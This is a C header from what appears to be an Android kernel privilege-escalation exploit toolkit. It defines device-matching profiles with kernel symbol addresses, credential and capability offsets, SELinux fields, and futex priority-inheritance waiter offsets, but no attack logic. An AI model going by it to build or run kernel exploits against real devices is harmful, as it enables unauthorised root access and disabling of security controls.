#ifndef GL_PROFILE_H
#define GL_PROFILE_H

#include <stddef.h>
#include <stdint.h>

#define GL_PROFILE_SCHEMA 3u
#define GL_PROFILE_STRING 256u

struct gl_runtime {
    char product[GL_PROFILE_STRING];
    char model[GL_PROFILE_STRING];
    char fingerprint[GL_PROFILE_STRING];
    char incremental[GL_PROFILE_STRING];
    char kernel_release[GL_PROFILE_STRING];
    char machine[GL_PROFILE_STRING];
};

struct gl_profile {
    uint32_t profile_version;
    char target[GL_PROFILE_STRING];
    char verification[GL_PROFILE_STRING];

    char match_product[GL_PROFILE_STRING];
    char match_model[GL_PROFILE_STRING];
    char match_fingerprint[GL_PROFILE_STRING];
    char match_incremental[GL_PROFILE_STRING];
    char match_kernel_release[GL_PROFILE_STRING];
    char match_machine[GL_PROFILE_STRING];

    char exploit_path[GL_PROFILE_STRING];
    uint32_t waiter_core;
    uint32_t consumer_core;
    uint32_t consumer_delay_us;

    uint32_t init_task;
    uint32_t pi_task;
    uint32_t ashmem_fops;
    uint32_t ashmem_misc_fops;
    uint32_t ashmem_open;
    uint32_t ashmem_release;
    uint32_t ashmem_ioctl;
    uint32_t ashmem_mmap;
    uint32_t configfs_read_file;
    uint32_t configfs_write_file;

    uint32_t task_tasks_off;
    uint32_t task_real_cred_off;
    uint32_t task_cred_off;
    uint32_t task_comm_off;

    uint32_t fops_read_off;
    uint32_t fops_ioctl_off;
    uint32_t fops_mmap_off;
    uint32_t fops_open_off;
    uint32_t fops_release_off;

    uint32_t configfs_page_off;
    uint32_t configfs_mutex_off;
    uint32_t configfs_needs_read_fill_off;

    uint32_t futex_hash_len;
    uint32_t futex_hash_seed;
    uint32_t futex_hash_buckets;

    uint32_t stamp_waiter_depth;
    uint32_t stamp_copy_depth;
    uint32_t stamp_socket_kind;

    uint32_t selinux_enforcing;
    uint32_t cred_cap_permitted_off;
    uint32_t cred_cap_effective_off;
    uint32_t cred_cap_bset_off;

    uint32_t task_prio_off;
    uint32_t task_static_prio_off;
    uint32_t task_normal_prio_off;
    uint32_t task_rt_priority_off;
    uint32_t task_sched_class_off;
    uint32_t task_pi_lock_off;
    uint32_t task_pi_waiters_off;
    uint32_t task_pi_top_task_off;
    uint32_t task_pi_blocked_on_off;

    uint32_t selinux_status_page;
    uint32_t mem_map;
    uint32_t pfn_offset;
    uint32_t page_struct_size;
    uint32_t lowmem_va_sub;

    char ota_sha256[GL_PROFILE_STRING];
    char boot_sha256[GL_PROFILE_STRING];
    char kernel_sha256[GL_PROFILE_STRING];
    char kernel_config_sha256[GL_PROFILE_STRING];
    char second_sha256[GL_PROFILE_STRING];
    char critical_anchors_sha256[GL_PROFILE_STRING];
    char reference[GL_PROFILE_STRING];
    uint32_t kernel_image_base;
    uint32_t kernel_size;
    uint32_t kernel_similarity_ppm;
};

int gl_runtime_read(struct gl_runtime *runtime, char *error, size_t error_size);
int gl_profile_select(const char *directory, const char *explicit_path,
                      const struct gl_runtime *runtime, struct gl_profile *profile,
                      char *selected_path, size_t selected_path_size, char *error,
                      size_t error_size);
int gl_profile_select_embedded(const struct gl_runtime *runtime, struct gl_profile *profile,
                               char *error, size_t error_size);
void gl_profile_print(const struct gl_profile *profile, const struct gl_runtime *runtime,
                      const char *selected_path);

#endif
